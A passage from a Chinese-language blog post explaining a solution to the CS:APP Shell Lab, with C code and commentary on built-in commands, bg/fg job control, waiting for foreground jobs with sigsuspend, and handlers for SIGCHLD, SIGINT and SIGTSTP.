<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * builtin_cmd - If the user has typed a built-in command then execute</span></span><br><span class="line"><span class="comment"> *    it immediately.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * builtin_cmd - 如果用户键入了内置命令，则立即执行</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<ul>
<li>builtin_cmd 函数的实现逻辑很简单，使用 strcmp 函数就可以了！</li>
<li>name 是内置命令 quit，终止进程（tsh shell）</li>
<li>name 是内置命令 jobs，列出后台所有进程，listjobs 函数已经帮我们实现了，返回 1</li>
<li>name 是内置命令 bg 或 fg，执行之后会实现的 do_bgfg 函数，返回 1</li>
<li>name 是 &amp;，返回 1，表示忽略 &amp;（这里是按照书上模板写的，我也不太了解 ……）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">builtin_cmd</span><span class="params">(<span class="type">char</span> **argv)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;quit&quot;</span>)) &#123; <span class="comment">// 如果等于内置的 quit 命令，终止 shell</span></span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;jobs&quot;</span>)) &#123;	<span class="comment">// 内置命令 jobs</span></span><br><span class="line">    	listjobs(jobs);</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>) || !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>)) &#123; <span class="comment">// 内置命令 bg fg</span></span><br><span class="line">    	do_bgfg(argv);</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;&amp;&quot;</span>)) &#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span> <span class="comment">/* 不是内置命令 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="do-bgfg"><a href="#do-bgfg" class="headerlink" title="do_bgfg"></a>do_bgfg</h1><ul>
<li>具体要求如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * do_bgfg - Execute the builtin bg and fg commands</span></span><br><span class="line"><span class="comment">  * do_bgfg - 执行内置的 bg 和 fg 命令 </span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>在实现 do_bgfg 函数之前我们需要明白，此时 argv 的 name 为 bg 或 fg；argv 的第二个参数有三种情况：PID（进程 ID）、%JID（作业 ID）、非法参数（既不是 PID 也不是 %JID）</p>
</li>
<li><p>我们首先检查参数是否是 %JID：检查参数的第一个字符（argv[1] [0]）是否是 ‘%’，如果是则执行 getjobjid，通过 JID 得到作业对象</p>
</li>
<li><p>这里有一个细节是：即使第二个参数是 %JID，它也可能是一个非法的 JID，即可能没有作业和它对应，因此我们还需要检测作业是否为 NULL，当然对于后边检查 ID 对应的作业也是如此</p>
</li>
<li><p>接着我们检查参数是否是 PID：通过 atoi 函数检查，atoi 函数将字符串转换为 int，如果转换失败则返回 0，并且每个 PID 都是一个正数，所以条件设置为 &gt; 0 即可；通过 getjobpid 得到对应作业后也需要检查作业是否存在</p>
</li>
<li><p>最后，我们需要根据 name 是 bg 还是 fg 来设置作业的 state 是前台 FG 还是后台 BG；通过 kill 函数给相应进程发送 SIGCONT 信号来重启进程；如果是 FG 则等待前台进程结束，BG 则打印进程信息</p>
</li>
<li><p>这里有一个细节</p>
<ul>
<li><p>我们必须先设置作业的 state，再执行 kill 函数发送信号给当前进程来重启进程，这样才可以保证这个进程重启后在前台或后台运行</p>
<blockquote>
<p>SIGCONT 信号的处理程序应该已经被修改了，因为它的默认行为是忽略）</p>
</blockquote>
</li>
<li><p>通过 kill 函数给当前进程发送信号时，应该使用 -pid，这代表发送信号给进程组 |pid| 中的每个进程。因为重启一个进程也代表重启这个进程的子进程，而不是仅仅重启当前进程（不使用 pid） </p>
<blockquote>
<p>这里其实也照应了之前我们执行的 setpgid，将每个子进程的进程组 ID 设置为了这个子进程的 PID</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">do_bgfg</span><span class="params">(<span class="type">char</span> **argv)</span> </span><br><span class="line">&#123;	</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    	<span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">&#x27;%&#x27;</span>) &#123;</span><br><span class="line">    	job = getjobjid(jobs, atoi(argv[<span class="number">1</span>] + <span class="number">1</span>));</span><br><span class="line">    	<span class="keyword">if</span> (job == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    		<span class="built_in">printf</span>(<span class="string">&quot;%s: No such job\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">    		<span class="keyword">return</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (atoi(argv[<span class="number">1</span>]) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    	</span><br><span class="line">    	job = getjobpid(jobs, atoi(argv[<span class="number">1</span>]));</span><br><span class="line">    	<span class="keyword">if</span> (job == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    		<span class="built_in">printf</span>(<span class="string">&quot;(%d): No such process\n&quot;</span>, atoi(argv[<span class="number">1</span>]));</span><br><span class="line">    		<span class="keyword">return</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    	<span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>)) &#123;</span><br><span class="line">    	job-&gt;state = BG;</span><br><span class="line">    	kill(-job-&gt;pid, SIGCONT);</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    	job-&gt;state = FG;</span><br><span class="line">    	kill(-job-&gt;pid, SIGCONT);</span><br><span class="line">    	waitfg(job-&gt;pid);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a>waitfg</h1><ul>
<li>具体要求如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * waitfg - Block until process pid is no longer the foreground process</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * waitfg - 阻塞，直到进程 pid 不再是前台进程</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>这里我们会用到一个已经实现了的函数 fgpid，它会返回作业列表中前台进程的 PID，如果没有前台进程则返回 0</p>
</li>
<li><p>我们可能想到的第一种实现，在 while 循环的条件中不断调用 fgpid 检查是否还有前台进程，循环体中什么也不做，直到作业列表中不再有前台进程</p>
<blockquote>
<p>这里 fgpid (jobs) &gt; 0 的作用其实和 fgpid (jobs) &#x3D;&#x3D; pid 一样，因为前台进程只有一个，如果没有前台进程就表示 pid 不再是前台进程的 PID</p>
</blockquote>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (fgpid(jobs) &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>这种实现有一个很大的缺陷，那就是消耗资源太大，由于我们的循环体什么也不做，这样不断的调用 fpgid 造成的消耗是很大的！</li>
<li>第二种可能的实现，我们在循环体中调用 pause 函数，pause 函数让调用函数休眠，直到进程接收到一个信号</li>
<li>这样看起来好像避免了资源的浪费，pause 让调用函数休眠，直到 SIGCHLD 信号将前台进程回收，调用函数被唤醒，退出循环</li>
<li>但这段代码其实有很严重的 <strong>竞争</strong>，如果在 while 检测之后、pause 之前收到 SIGCHLD 信号的话，前台进程被回收，那么 pause 会陷入永久休眠</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (fgpid(jobs) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    pause();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>第三种可能的实现，我们使用 sleep 函数，将一个进程挂起指定的时间</p>
</li>
<li><p>但这种实现的一个缺陷是：我们很难定量挂起的时间，如果间隔太长，程序运行的太慢，如果间隔太短，消耗又太大！</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (fgpid(jobs) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>最终的实现，我们使用 sigsuspend 函数，它的效果相当于如下语句。它还具有原子性，即不会有信号在 sigprocmask 之后、pause 之前到达，pause 不会有造成永久休眠的风险</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);</span><br><span class="line">pause();</span><br><span class="line">sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>但如果我们仅仅把它写成如下形式，它还是会有严重的竞争，如果在 while 检测之后、sigsuspend 之前收到 SIGCHLD 信号，那还是会造成永久休眠！</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">sigset_t</span> mask;</span><br><span class="line">sigemptyset(&amp;mask);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (fgpid(jobs) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    sigsuspend(mask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>因此我们需要在 while 检测之前阻塞 SIGCHLD 信号，保证不会有 SIGCHLD 信号在 while 检测之后、sigsuspend 之前达到，sigsuspend 函数解除所有阻塞，等待 SIGCHLD 信号 </li>
<li>具体实现如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">waitfg</span><span class="params">(<span class="type">pid_t</span> pid)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">sigset_t</span> mask_one, mask, prev;</span><br><span class="line">    sigemptyset(&amp;mask);</span><br><span class="line">    sigemptyset(&amp;mask_one);</span><br><span class="line">    sigaddset(&amp;mask_one, SIGCHLD);</span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev);</span><br><span class="line">   </span><br><span class="line">	<span class="keyword">while</span> (fgpid(jobs) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">   		sigsuspend(&amp;mask);</span><br><span class="line">   	&#125;</span><br><span class="line">   </span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="sigchld-handler"><a href="#sigchld-handler" class="headerlink" title="sigchld_handler"></a>sigchld_handler</h1><ul>
<li>具体要求如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span></span><br><span class="line"><span class="comment"> *     a child job terminates (becomes a zombie), or stops because it</span></span><br><span class="line"><span class="comment"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span></span><br><span class="line"><span class="comment"> *     available zombie children, but doesn&#x27;t wait for any other</span></span><br><span class="line"><span class="comment"> *     currently running children to terminate.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 当一个孩子作业因为接收到一个 SIGSTOP 或 SIGTSTP 信号终止或停止时，内核发送一个 SIGCHID 信号给 shell</span></span><br><span class="line"><span class="comment"> * 处理程序回收所有当前的僵尸进程，但不会等待任何其他当前正在运行但即将终止的进程</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>使用 waitpid 函数回收僵尸进程，由于未处理的信号不会排队，所以需要我们配合 while 使用</p>
</li>
<li><p>什么叫未处理的信号不会排队呢，未处理的信号不会排队指的是：每个类型的信号只能有一个未处理的信号，如果有一个未处理的信号就表明 <strong>至少</strong> 有一个信号达到了</p>
</li>
<li><p>这就会导致如果 SIGCHLD 信号处理程序每次只会执行一次 waitpid 的话，当它正在回收一个僵尸进程时，第二个 SIGCHLD 信号达到成为未处理的信号，而当它还在处理第一个子进程时，第三个 SIGCHLD 信号又到达了，由于每个类型的信号只能有一个未处理的信号，那么第三个 SIGCHLD 的所有信息会丢失</p>
</li>
<li><p>因此我们需要保证每次调用 SIGCHLD 信号处理程序时需要尽可能回收多的僵尸进程，那就需要让 while 和 waitpid 配合使用</p>
</li>
<li><p>由于：</p>
<ul>
<li>当一个孩子作业因为接收到一个 SIGSTOP 或 SIGTSTP 信号终止或停止时，内核发送一个 SIGCHID 信号给 shell，因此我们需要处理终止和停止的情况</li>
<li>不会等待任何其他当前正在运行但即将终止的进程，即不要在每次调用 waitpid 时阻塞</li>
</ul>
</li>
<li><p>这就要求我们修改 waitpid 的默认行为，<strong>WNOHANG | WUNTRACED</strong> 表示：立即返回，如果等待集合中没有子进程被停止或终止，返回 0；如果有一个停止或终止，返回该子进程的 PID</p>
</li>
<li><p>由于：如果任何作业因为收到未捕获的信号而终止，则应识别此事件并打印一条消息，其中包含作业的 PID 和对违规信号的描述</p>
<blockquote>
<p>因为收到未捕获的信号而终止表示：有些信号的默认行为可能是终止进程，而未捕获就表示这个信号没有被设置相应的信号处理程序，即没有修改它的默认行为</p>
</blockquote>
</li>
<li><p>说明终止有两种情况：正常终止、因为收到未捕获的信号而终止</p>
</li>
<li><p>这时我们一共需要处理三种情况：正常终止、因未捕获的信号而终止、停止</p>
</li>
<li><p>所以在处理回收子进程的后续过程中，我们需要根据已回收子进程的退出状态 status 来分别进行处理</p>
<ul>
<li><p>如果子进程正常终止，从作业列表中删除该子进程</p>
<blockquote>
<p>注意在 deletejob 前需要阻塞信号）</p>
</blockquote>
</li>
<li><p>如果子进程因为一个未捕获的信号而终止，从作业列表中删除该子进程，打印相关信息</p>
</li>
<li><p>如果子进程因为被停止而返回，打印相关信息，将该子进程的 state 设置为 ST 停止</p>
<blockquote>
<p>具体打印信息，需要通过 make rtest&lt; x &gt; 让 tshref 可执行文件运行相关测试用例得到</p>
</blockquote>
</li>
</ul>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sigchld_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> olderrno = errno;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line">    <span class="type">sigset_t</span> mask, prev_mask;</span><br><span class="line">    </span><br><span class="line">    sigfillset(&amp;mask);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> ((pid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    	sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev_mask);</span><br><span class="line">    	</span><br><span class="line">    	<span class="keyword">if</span> (WIFEXITED(status)) &#123; <span class="comment">// 子进程正常终止</span></span><br><span class="line">    		deletejob(jobs, pid);</span><br><span class="line">    	</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status)) &#123; <span class="comment">// 因为一个未捕获的信号而终止</span></span><br><span class="line">    		job = getjobpid(jobs, pid);</span><br><span class="line">    		<span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, WTERMSIG(status));</span><br><span class="line">    		deletejob(jobs, pid);</span><br><span class="line">    	</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// 引起返回的子进程是停止的</span></span><br><span class="line">    		job = getjobpid(jobs, pid);</span><br><span class="line">    		<span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, WSTOPSIG(status));</span><br><span class="line">    		job-&gt;state = ST;</span><br><span class="line">    		</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">    	sigprocmask(SIG_SETMASK, &amp;prev_mask, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    errno = olderrno;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="sigint-cmd"><a href="#sigint-cmd" class="headerlink" title="sigint_cmd"></a>sigint_cmd</h1><ul>
<li>具体要求如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="line"><span class="comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="line"><span class="comment"> *    to the foreground job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigint_handler - 内核在 shell 中发送 SIGINT 当用户在键盘上键入 Ctrl-C 时 </span></span><br><span class="line"><span class="comment"> * 抓住它并发送它到前台作业 </span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>因为要求：键入 ctrl-c （ctrl-z） 应将 SIGINT （SIGTSTP） 信号发送到当前前台作业以及该作业的任何后代</p>
</li>
<li><p>所以这里唯一的实现细节是：如果真的有前台作业，通过 kill 发送 SIGINT 信号时需要使用 -pid，发送给进程组 |pid| 中的所有进程</p>
<blockquote>
<p>由于执行了 setpgid，前台进程和它的子进程都在以前台进程的 PID 作为进程组 ID 的进程组中</p>
</blockquote>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sigint_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> olderrno = errno;</span><br><span class="line">    <span class="type">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) </span><br><span class="line">    	kill(-pid, SIGINT);</span><br><span class="line">    errno = olderrno;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="sigtstp-cmd"><a href="#sigtstp-cmd" class="headerlink" title="sigtstp_cmd"></a>sigtstp_cmd</h1><ul>
<li>具体要求如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="line"><span class="comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="line"><span class="comment"> *     foreground job by sending it a SIGTSTP.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigtstp_handler - 内核在任何时候都会向 shell 发送 SIGTSTP 当用户在键盘上键入 Ctrl-Z 时</span></span><br><span class="line"><span class="comment"> * 抓住它并暂停前台作业，通过向其发送 SIGTSTP </span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>实现细节和 sigint_cmd 一样，这里就不再赘述了</p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sigtstp_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> olderrno = errno;</span><br><span class="line">    <span class="type">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) </span><br><span class="line">    	kill(-pid, SIGTSTP);</span><br><span class="line">    errno = olderrno;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h1><ul>
<li>由于测试用例众多，这里我们就仅测试几个复杂的：trace14.txt、trace15.txt、trace16.txt</li>
<li><strong>make test14</strong></li>
</ul>
<style>.isiniqneqjss{}</style><img src="/2024/03/30/CSAPP-Lab6/image-20240331152705024.png" class="isiniqneqjss" alt="image-20240331152705024">			

<ul>
<li><strong>make rtest14</strong></li>
</ul>
<style>.mpsodbzlxvuy{}</style><img src="/2024/03/30/CSAPP-Lab6/image-20240331152744491.png" class="mpsodbzlxvuy" alt="image-20240331152744491">  

<ul>
<li><strong>make test15</strong></li>
</ul>
<p>																										</p>
<style>.wwyutcjhudjz{zoom:;}</style><img src="/2024/03/30/CSAPP-Lab6/image-20240331153014941.png" class="wwyutcjhudjz" alt="image-20240331153014941">			

<ul>
<li><strong>make rtest15</strong></li>
</ul>
<style>.edlrxnsnkvfh{}</style><img src="/2024/03/30/CSAPP-Lab6/image-20240331153044693.png" class="edlrxnsnkvfh" alt="image-20240331153044693">	

<ul>
<li><strong>make test16</strong></li>
</ul>
<p>																									</p>
<style>.drqejjwdktoe{}</style><img src="/2024/03/30/CSAPP-Lab6/image-20240331153212772.png" class="drqejjwdktoe" alt="image-20240331153212772">					 

<ul>
<li><strong>make rtest16</strong></li>
</ul>
<style>.piknyiusoikk{}</style><img src="/2024/03/30/CSAPP-Lab6/image-20240331153239153.png" class="piknyiusoikk" alt="image-20240331153239153">	

<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p>[<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/343064110">已完成+附代码]CS:APP:Lab6-ShellLab - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhiyiYo/p/16297819.html">CSAPP 之 ShellLab 详解 - 之一Yo - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/492645370">CSAPP | Lab7-Shell Lab 深入解析 - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89224358">CSAPP实验之shell lab - 知乎 (zhihu.com)</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yiweiboi.github.io/2024/03/22/CSAPP-Lab5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yiweiBoi">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
